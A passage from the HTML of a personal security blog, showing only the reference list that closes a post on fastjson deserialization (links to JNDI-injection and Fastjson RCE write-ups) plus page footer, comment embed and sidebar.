+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200411005234842.png" alt="image-20200411005234842"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></li>
+<li>[<a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson</a> RCE PoC构造与分析/)</li>
+<li><a href="https://p0rz9.github.io/2019/05/05/JNDI注入入门/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/05/05/JNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</a></li>
+<li><a href="https://p0rz9.github.io/2019/06/02/Fatsjson反序列化后续/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/06/02/Fatsjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%BB%AD/</a></li>
+<li><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/" target="_blank" rel="noopener">https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/</a></li>
+<li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a></li>
+<li><a href="https://www.smi1e.top/java代码审计学习之jndi注入/" target="_blank" rel="noopener">https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</a></li>
+<li><a href="https://xz.aliyun.com/t/6633#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633#toc-5</a></li>
+<li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></li>
+<li><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">https://paper.seebug.org/417/</a></li>
+<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cki31jpyv000ecpndfuksdakt" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/05/FART%E5%85%A8%E8%87%AA%E5%8A%A8%E8%84%B1%E5%A3%B3%E6%9C%BA%E9%95%9C%E5%83%8F%E5%88%B7%E6%9C%BA%E4%BD%93%E9%AA%8C/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          FART全自动脱壳机镜像刷机体验
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/04/04/Empire%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Empire源码分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://chiahao-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Malware/" rel="tag">Malware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wiki/" rel="tag">Wiki</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Java/" style="font-size: 15px;">Java</a> <a href="/tags/Malware/" style="font-size: 10px;">Malware</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Wiki/" style="font-size: 15px;">Wiki</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/29/ysoserial-URLDNS/">Ysoserial-URLDNS</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/15/Shiro-550-Shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Shiro-550 &amp; Shiro-721反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/05/ARM-Assembly%E7%AC%94%E8%AE%B0/">ARM Assembly学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/21/Objection%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">Objection使用笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/13/Android%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%A0%91/">Android安全技能树</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 _KernelPanic<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
